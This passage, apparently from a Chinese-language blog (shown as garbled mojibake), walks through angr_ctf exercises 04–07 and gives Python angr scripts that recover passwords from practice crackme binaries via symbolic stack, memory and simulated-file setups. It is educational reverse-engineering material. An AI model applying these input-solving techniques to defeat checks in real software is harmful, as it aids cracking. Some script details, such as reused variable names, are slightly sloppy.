id="04-angr-symbolic-stackï¼šç¬¦å·åŒ–æ ˆ"><a href="#04-angr-symbolic-stackï¼šç¬¦å·åŒ–æ ˆ" class="headerlink" title="04_angr_symbolic_stackï¼šç¬¦å·åŒ–æ ˆ"></a>04_angr_symbolic_stackï¼šç¬¦å·åŒ–æ ˆ</h2><p>è¿˜æ˜¯æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œä¸»è¦çš„å¤„ç†é€»è¾‘åœ¨ <code>handle_user()</code> å½“ä¸­ï¼Œè¿˜æ˜¯è¯»å…¥ä¸¤ä¸ªæ•°ä¹‹åæ‰”ç»™ä¸åŒçš„ complex å‡½æ•°å¤„ç†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/TZrWvDe5iq3R1E7.png" alt="image.png"></p><p>ç„¶åä½ ä¼šå‘ç°ç”¨ä¸Šä¸Šé¢˜çš„è„šæœ¬ä¹Ÿèƒ½ç§’è§£â€¦ä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><p>é‡æ–°è¯»ä¸€ä¸‹é¢˜ç›®â€”â€”<code>symbolic stack</code>ï¼Œè¿™æ„å‘³ç€<strong>æœ¬é¢˜æˆ‘ä»¬åº”å½“å°†æ ˆè®¾ç½®ä¸ºç¬¦å·å˜é‡æ¥è¿›è¡Œçº¦æŸæ±‚è§£</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé‡æ–°æ¥çœ‹ <code>handler_user()</code> çš„æ±‡ç¼–ä»£ç ï¼Œä¸¤ä¸ªå¾…æ±‚è§£å˜é‡éƒ½æ˜¯ä½äºæ ˆä¸Šçš„å›ºå®šä½ç½®ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/ihsBNwyqpUJrneg.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥å°†åˆå§‹çŠ¶æ€è®¾ç½®ä¸ºä»è¯»å…¥è¾“å…¥åå¼€å§‹çš„ç©ºç™½çŠ¶æ€ï¼Œä¹‹ååˆ›å»ºä¸¤ä¸ªä½å‘é‡ç¬¦å·ï¼Œè®¾ç½®å¥½ ebp å’Œ esp çš„ç›¸å¯¹ä½ç½®åä½¿ç”¨  <code>state.stack_push(val)</code> æ¥<strong>æ‰‹åŠ¨åœ°å°†ç¬¦å·å˜é‡æ¨åˆ°æ ˆä¸Š</strong>ï¼Œæœ€åçš„æ±‚è§£è·¯å¾„è¿˜æ˜¯è®¾ä¸ºè¾“å‡º <code>&quot;Good Job.&quot;</code> çš„åœ°å€å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä»”ç»†è®¡ç®—å˜é‡åœ¨æ ˆä¸Šçš„ä½ç½®</p><p>æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import sys<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./04_angr_symbolic_stack&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x80493EF # first insn after `call scanf`<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # create symbolic variables<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 32) # 32-bit integer<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 32) # 32-bit integer<br>    <br>    # set the context<br>    init_state.regs.ebp = init_state.regs.esp<br>    ## first val is on [ebp - 0xC], so we need to `sub esp` so that we can push properly<br>    init_state.regs.esp -= 0x8<br>    ## these two variables are continuous on the stack<br>    init_state.stack_push(password_0)<br>    init_state.stack_push(password_1)<br>    ## the relative position of esp when return from scanf()<br>    ## seems that it&#x27;s okay to not do it?<br>    init_state.regs.esp -= 12<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x804943C, avoid = 0x804942A)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0)<br>        solution_1 = solution_state.solver.eval(password_1)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/e7sESMFHzIxb26X.png" alt="image.png"></p><h2 id="05-angr-symbolic-memoryï¼šç¬¦å·åŒ–å†…å­˜"><a href="#05-angr-symbolic-memoryï¼šç¬¦å·åŒ–å†…å­˜" class="headerlink" title="05_angr_symbolic_memoryï¼šç¬¦å·åŒ–å†…å­˜"></a>05_angr_symbolic_memoryï¼šç¬¦å·åŒ–å†…å­˜</h2><p>è¿˜æ˜¯æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œè¿™ä¸€æ¬¡æ˜¯è¯»å…¥å››ä¸ª 8 å­—èŠ‚åˆ°ä¸€å—è¿ç»­çš„ 32 å­—èŠ‚å†…å­˜ä¸Šï¼Œå…¶ä¸­ <code>user_input</code> çš„åœ°å€ä¾¿æ˜¯ <code>0x82F48A0</code>ï¼Œä¹‹åè°ƒç”¨ <code>complex_function()</code> é€å­—ç¬¦å¤„ç†è¿™ 32 å­—èŠ‚åä¸ç‰¹å®šå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/ZhNrVoe3gK9G5PJ.png" alt="image.png"></p><p>é‚£ä¹ˆä»é¢˜ç›®åç§°æˆ‘ä»¬ä¸éš¾çœ‹å‡º<strong>è¿™ä¸€æ¬¡æˆ‘ä»¬åº”å½“è¦å°†å†…å­˜ä½œä¸ºç¬¦å·å˜é‡è¿›è¡Œçº¦æŸæ±‚è§£</strong></p><h3 id="state-çš„å†…å­˜æ“ä½œ"><a href="#state-çš„å†…å­˜æ“ä½œ" class="headerlink" title="state çš„å†…å­˜æ“ä½œ"></a>state çš„å†…å­˜æ“ä½œ</h3><p>å‰é¢è®²åˆ°ï¼Œå¯¹äºä¸€ä¸ªçŠ¶æ€çš„å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>state.memory</code> çš„å¯¹åº”æ¥å£è¿›è¡Œæ“ä½œï¼š</p><ul><li><code>state.memory.load(addr, size_in_bytes)</code> ï¼šè·å–è¯¥åœ°å€ä¸ŠæŒ‡å®šå¤§å°çš„ä½å‘é‡</li><li><code>state.memory.store(addr, bitvector)</code> ï¼šå°†ä¸€ä¸ªä½å‘é‡å­˜å‚¨åˆ°æŒ‡å®šåœ°å€</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœè¦å‚¨å­˜å…·ä½“å€¼ï¼Œåˆ™éœ€è¦é€šè¿‡ <code>endness</code> å‚æ•°æŒ‡å®šå¤§å°ç«¯åº</p><h3 id="FINAL-EXPLOIT-2"><a href="#FINAL-EXPLOIT-2" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæœ¬é¢˜è¿˜æ˜¯åˆ›å»ºå¯¹åº”å¤§å°çš„ BVS å explore() å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨è·å–æœ€åæ±‚è§£çš„å€¼æ—¶åˆ«å¿˜äº†æŒ‡å®šå‚æ•° <code>cast_to=bytes</code> ä»¥è·å¾—å­—ç¬¦è¾“å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./05_angr_symbolic_memory&#x27;</span><br>    proj = angr.Project(bin_path)<br>    start_addr = <span class="hljs-number">0x8049315</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create symbolic variables</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_3 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    <br>    <span class="hljs-comment"># insert the symbolic vals into memory</span><br>    init_state.memory.store(<span class="hljs-number">0x82F48A0</span>, password_0)<br>    init_state.memory.store(<span class="hljs-number">0x82F48A8</span>, password_1)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B0</span>, password_2)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B8</span>, password_3)<br>    <br>    <span class="hljs-comment"># now to solve!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x8049381</span>, avoid = <span class="hljs-number">0x804936F</span>)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_3: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_3))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡çš„æ±‚è§£éœ€è¦ä¸€ç‚¹ç‚¹æ—¶é—´ï¼Œä»¥åŠä¸€å®šé‡çš„å†…å­˜ï¼ˆç¬”è€…ä»… 2G å†…å­˜çš„é˜¿é‡Œäº‘å­¦ç”Ÿæœºåœ¨è·‘è§£é¢˜è„šæœ¬æ—¶å°±è¢« Kill äº†å‡ æ¬¡ï¼Œæœ€åä¸å¾—ä¸ç”¨ä¸€äº›æ–¹æ³•è…¾ä¸€äº›å†…å­˜åæ‰æå®š</p><p><img src="https://s2.loli.net/2022/10/31/5Mymf9v8dTKUFWu.png" alt="image.png"></p><h2 id="06-angr-symbolic-dynamic-memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜"><a href="#06-angr-symbolic-dynamic-memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜" class="headerlink" title="06_angr_symbolic_dynamic_memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜"></a>06_angr_symbolic_dynamic_memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œè¿˜æ˜¯æƒ¯ä¾‹åœ°è¯»å…¥è¾“å…¥å complex å¤„ç†åè¿›è¡Œå¯¹æ¯”ï¼Œä¸è¿‡ä¸ä¸€æ ·çš„æ˜¯æœ¬é¢˜å­˜å‚¨è¾“å…¥ä½¿ç”¨çš„æ˜¯<strong>åŠ¨æ€åˆ†é…çš„å†…å­˜</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/dQEJzTtXKWZaPLV.png" alt="image.png"></p><p>é‚£ä¹ˆæ€ä¹ˆå¤„ç†å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä»å‚¨å­˜è¿™ä¸¤å—å†…å­˜çš„æŒ‡é’ˆçš„åœ°å€å…¥æ‰‹ï¼Œæ³¨æ„åˆ°ä¸¤ä¸ªæŒ‡é’ˆ <code>buffer0</code> ä¸ <code>buffer1</code> æ˜¯ä¸¤ä¸ªå…¨å±€å˜é‡ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/XkKs9MjUmh2yGbw.png" alt="image.png"></p><ul><li>å°†åˆå§‹çŠ¶æ€è®¾ä¸º<strong>è¯»å–å®Œè¾“å…¥åçš„çŠ¶æ€</strong></li><li>ä»»æ„é€‰ä¸¤ä¸ªåœ°å€ä½œä¸º fake chunk çš„åœ°å€ï¼Œå¹¶å°†è¿™ä¸¤ä¸ª buffer æŒ‡é’ˆæŒ‡å‘ fake chunk</li><li>å†åœ¨ fake chunk å†…å­˜ä¸Šæ”¾ç½®ç›¸åº”çš„å†…å­˜ç¬¦å·å˜é‡è¿›è¡Œæ±‚è§£å³å¯</li></ul><p>å› ä¸ºç¬¦å·æ‰§è¡Œä¸ä¼šå®é™…æ‰§è¡Œç¨‹åºï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä»»æ„è®¾ç½® fake chunk åœ°å€å¹¶ä¸ä¼šå¯¼è‡´ segmentation fault çš„å‘ç”Ÿï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å¯¹äºå…·ä½“çš„å€¼è€Œè¨€æˆ‘ä»¬åˆ«å¿˜äº†é€šè¿‡ <code>endness</code> å‚æ•°æŒ‡å®šå¤§å°ç«¯åº</p><p>äºæ˜¯æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./06_angr_symbolic_dynamic_memory&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x804938C # first insn after scanf()<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # set the buffer0&#x27;s and buffer1&#x27;s val to our specific address<br>    buf0_addr = 0x9B20684<br>    buf1_addr = 0x9B2068C<br>    fake_chunk0_addr = 0x1145140<br>    fake_chunk1_addr = 0x1919810<br>    init_state.memory.store(buf0_addr,fake_chunk0_addr, endness=proj.arch.memory_endness)<br>    init_state.memory.store(buf1_addr,fake_chunk1_addr, endness=proj.arch.memory_endness)<br>    <br>    # create symbolic vals and set fake_chunk to them<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 64) # 8 bytes = 64 bits<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 64) # 8 bytes = 64 bits<br>    init_state.memory.store(fake_chunk0_addr, password_0)<br>    init_state.memory.store(fake_chunk1_addr, password_1)<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x8049452, avoid = 0x8049440)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0, cast_to=bytes)<br>        solution_1 = solution_state.solver.eval(password_1, cast_to=bytes)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/6Oyk2cTxbDjpYVE.png" alt="image.png"></p><h2 id="07-angr-symbolic-fileï¼šç¬¦å·åŒ–æ–‡ä»¶"><a href="#07-angr-symbolic-fileï¼šç¬¦å·åŒ–æ–‡ä»¶" class="headerlink" title="07_angr_symbolic_fileï¼šç¬¦å·åŒ–æ–‡ä»¶"></a>07_angr_symbolic_fileï¼šç¬¦å·åŒ–æ–‡ä»¶</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œå‘ç°å…¶ä¼šå…ˆè¯»å…¥ 64 å­—èŠ‚ï¼Œä¹‹åé€šè¿‡ <code>ignoreme()</code> å°†å…¶å†™å…¥ä¸€ä¸ªç‰¹å®šæ–‡ä»¶ä¸­ï¼Œå†ä»è¯¥æ–‡ä»¶ä¸­æŠŠè¾“å…¥è¯»å›æ¥ï¼Œä¹‹åå°±åˆæ˜¯å¸¸è§„çš„ complex æ“ä½œä¸€ç•ªåä¸ä¸€ä¸ªç‰¹å®šå­—ç¬¦ä¸²è¿›è¡Œæ¯”å¯¹</p><p><img src="https://s2.loli.net/2022/10/31/snWIloVkGtUxcdz.png" alt="image.png"></p><p>æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯<strong>ç›´æ¥ä»æ–‡ä»¶è¯»å…¥ç»“æŸåå¼€å§‹ä½œä¸ºåˆå§‹çŠ¶æ€</strong>ï¼Œä¹‹åç”¨ 05 çš„ç¬¦å·åŒ–å†…å­˜çš„æ–¹æ³•æ¥æ±‚è§£ï¼Œä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><h3 id="Emulated-Filesystem-angr-çš„æ–‡ä»¶ç³»ç»Ÿ"><a href="#Emulated-Filesystem-angr-çš„æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Emulated Filesystem - angr çš„æ–‡ä»¶ç³»ç»Ÿ"></a>Emulated Filesystem - angr çš„æ–‡ä»¶ç³»ç»Ÿ</h3><p>åœ¨ angr å½“ä¸­ä¸æ–‡ä»¶ç³»ç»Ÿé—´çš„æ“ä½œæ˜¯é€šè¿‡ <code>SimFile</code> å¯¹è±¡å®Œæˆçš„ï¼ŒSimFile ä¸ºå¯¹  <em>å­˜å‚¨</em>  çš„æŠ½è±¡æ¨¡å‹ï¼Œä¸€ä¸ª SimFile å¯¹è±¡å¯ä»¥è¡¨ç¤ºä¸€ç³»åˆ—çš„å­—èŠ‚ã€ç¬¦å·ç­‰</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>angr.SimFile()</code> æ¥åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿæ–‡ä»¶ï¼Œåˆ›å»ºå¸¦æœ‰å…·ä½“å€¼ä¸ç¬¦å·å˜é‡çš„ SimFile ğŸŒ°å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr, claripy<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="hljs-string">&#x27;a_file&#x27;</span>, content = <span class="hljs-string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="hljs-string">&#x27;another_file&#x27;</span>, bvs, size=<span class="hljs-number">8</span>) <span class="hljs-comment"># size in bytes there</span><br></code></pre></td></tr></table></figure><p>æ¨¡æ‹Ÿæ–‡ä»¶éœ€è¦ä¸ç‰¹å®šçš„çŠ¶æ€è¿›è¡Œå…³è”ï¼Œé€šè¿‡ <code>state.fs.insert(sim_file)</code> æˆ– <code>sim_file.set_state(state)</code> æˆ‘ä»¬å¯ä»¥å°† SimFile æ’å…¥åˆ°ä¸€ä¸ªçŠ¶æ€çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="hljs-string">&#x27;test_file&#x27;</span>, sim_file)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pos = <span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p>å¯¹äº  <em>æµ</em>  ï¼ˆStreamsï¼Œä¾‹å¦‚æ ‡å‡†IOã€TCPè¿æ¥ç­‰ï¼‰ç±»å‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>angr.SimPackets()</code> æ¥åˆ›å»ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="hljs-string">&#x27;my_packet&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet<br>&lt;angr.storage.file.SimPackets <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f75626a2e80</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-3"><a href="#FINAL-EXPLOIT-3" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæœ¬é¢˜å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬åˆ©ç”¨ angr æ¥åˆ›å»ºä¸€ä¸ª<strong>æ¨¡æ‹Ÿæ–‡ä»¶</strong>ä»¥æ¨¡æ‹Ÿè¯»å–æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬å°†åˆå§‹çŠ¶æ€è®¾ä¸ºä»æ‰“å¼€æ–‡ä»¶å¼€å§‹ï¼Œä¹‹ååˆ›å»ºä¸€ä¸ªä½å‘é‡ç¬¦å·æ”¾å…¥æ¨¡æ‹Ÿæ–‡ä»¶å¹¶å°†æ¨¡æ‹Ÿæ–‡ä»¶æ’å…¥æ–‡ä»¶ç³»ç»Ÿï¼Œä¹‹åæ¢ç´¢åˆ°å¯¹åº”çŠ¶æ€åæ±‚è§£å³å¯ï¼Œè§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./07_angr_symbolic_file&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_address = <span class="hljs-number">0x8049550</span> <span class="hljs-comment"># first insn returned from ignoreme()</span><br>    init_state = proj.factory.blank_state(addr = start_address)<br><br>    <span class="hljs-comment"># create BVS and SimFile</span><br>    file_size = <span class="hljs-number">0x40</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, file_size * <span class="hljs-number">8</span>) <span class="hljs-comment"># 0x40 bytes</span><br>    file_name = <span class="hljs-string">&#x27;KBECVEJF.txt&#x27;</span><br>    sim_file = angr.storage.SimFile(file_name, password, size = file_size)<br><br>    <span class="hljs-comment"># load the SimFile</span><br>    init_state.fs.insert(file_name, sim_file)<br><br>    <span class="hljs-comment"># solve it</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find the solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/lTfoUMzQANGSbnH.png" alt="image.png"></p><h1 id="0x03-angr-ctfï¼šçº¦æŸæ¡ä»¶"><a href="#0x03-angr-ctfï¼šçº¦æŸæ¡ä»¶" class="headerlink" title="0x03. 